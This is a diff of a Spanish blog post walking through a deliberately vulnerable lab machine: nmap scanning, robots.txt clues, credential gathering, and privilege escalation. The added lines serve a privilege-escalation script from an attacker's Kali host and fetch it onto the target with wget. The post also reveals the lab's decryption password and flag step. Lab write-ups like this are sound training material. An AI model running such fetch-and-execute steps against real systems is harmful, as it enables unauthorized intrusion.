@@ -27,7 +27,7 @@ Una vez que conocemos la dirección IP, lanzamos nmap y vemos qué puertos/servi
 
 El resultado: la máquina tiene un servidor web, y el archivo robots.txt ya nos da alguna pista de por dónde empezar a mirar.
 
-![placeholder]({{ site.url }}/assets/img/0016_20171124_owasp_top_ten.png)   -> la imagen de la salida del nmap.
+![placeholder]({{ site.url }}/assets/img/0029_201080607_0001.png)
 
 Pues nada, vamos a echarle un ojo a los sitios incluidos en el robots.txt
 
@@ -35,7 +35,7 @@ login.php, dev_shell.php, lat_memo.html y passwords.html
 
 Miro primero en passwords.html... era muy bonito para ser real, los admin nos cuentan que antes alguien se despistó y puso las passwords, pero que ya se ha quitado.
 
-![placeholder]({{ site.url }}/assets/img/0016_20171124_owasp_top_ten.png)   -> la imagen del passwords.
+![placeholder]({{ site.url }}/assets/img/0030_201080607_0002.png)
 
 Miro en login.php, que da error, y en login.html que nos informa que está desactivada la página de login. Pues nada, en principio no habrá que forzar la inyección SQL en el formulario de login ;) Nos vamos a mirar la consola de desarrollo.
 
@@ -92,20 +92,53 @@ Entonces, recopilando, tenemos 3 credenciales (las de elliot, jc y seb); un docu
 
 En la máquina de la entrada anterior esto no era un problema, porque el servicio corría como root, por lo que al conseguir explotarlo nuestra shell era root.
 
-Ahora tenemos que conseguir esa shell de root. 
+Ahora tenemos que conseguir esa shell de root. Vamos a ver qué kernel corre, por si tuviese vulnerabilidades conocidas:
+* _uname -a_
 
-uname -a
+![placeholder]({{ site.url }}/assets/img/0039_201080607_0011.png)
 
-Está actualizado, así que nada. Miramos el linuxprivchecker, y nada a priori.
+Está actualizado, así que mejor centrarse en otras opciones. Los scripts que había en python sugerían correrlos con sudo, pero ninguno de los usuarios para los que tenemos credenciales puede hacerlo; además no se pueden modificar y en el crontab no se les llama...
+
+En este punto podemos usar un script que revisa los principales puntos para hacer la escalada de privilegios en sistemas linux. El script se llama linuxprivchecker, y para mí se convirtió en herramienta imprescindible cuando estaba haciendo el OSCP.
+
+Lo descargamos en /tmp desde la máquina vulnerable con wget, sirviéndolo desde la máquina Kali con SimpleHTTP:
+* _python -m SimpleHTTP 80_ [en la máquina Kali]
+* _wget http://ip_de_kali/linuxprivchecker.py_ [en la máquina vulnerable]
+
+![placeholder]({{ site.url }}/assets/img/0040_201080607_0012.png)
+
+Lo ejecutamos:
+* _python linuxprivchecker.py_
+
+y viendo los resultados, a priori no hay nada que resalte mucho.
 
 Así que toca hacer recapitulación... ¿qué tenemos? Las claves de 3 de los 4 usuarios, dos scripts en python que no hacen nada y que no están en el crontab, un fichero cifrado y un fichero que imprime frases absurdas en pantalla.
+
+![placeholder]({{ site.url }}/assets/img/0041_201080607_0013.png)
+
+[En este punto empezamos a sudar viendo que puede que la máquina se resuelva descifrando el fichero... lo que puede implicar "idea feliz" :p ].
 
 Pues nada, vamos a probar cosas para descifrar el fichero (mezcla de random y fuerza bruta). El comando [será] (https://www.gnupg.org/gph/en/manual/x110.html):
 
 * _gpg --output login.txt --decrypt login.txt.gpg_
 
-https://www.gnupg.org/gph/en/manual/x110.html
+![placeholder]({{ site.url }}/assets/img/0044_201080607_0014)
 
-Linux privchecker
+Vamos allá, a probar ideas felices: bob, james, seb, elliot... no, de momento no hemos acertado. En el fichero "notes.sh" había referencias a Harry Potter, vamos a probar: "Harry", "HarryPotter", "Gryffindor", ... 
 
+De momento tampoco... Como no estamos en un examen, era el momento de pedir el comodín de la llamada. Más que nada, porque seguir probando combinaciones sin garantía puede ser un "rabbit hole" y pasar así un par de horas sin resultados.
 
+Al descargar la máquina, también se muestra un enlace a un walkthrough. Vamos a echarle un ojo, a ver cómo de lejos estábamos.
+
+Al mirarlo, veo que la contraseña es la primera letra de cada frase: HARPOCRATES.
+
+No comments, podría haber pasado horas y probablemente no me habría dado por probar esa palabra, así que bien hecho está :)
+
+El siguiente paso es trivial, tenemos la clave de bob:
+
+![placeholder]({{ site.url }}/assets/img/0043_201080607_0015)
+
+Así que abrimos la sesión de bob, nos vamos a la raíz y hacemos:
+* _sudo cat flag.txt_
+
+![placeholder]({{ site.url }}/assets/img/0044_201080607_0016)
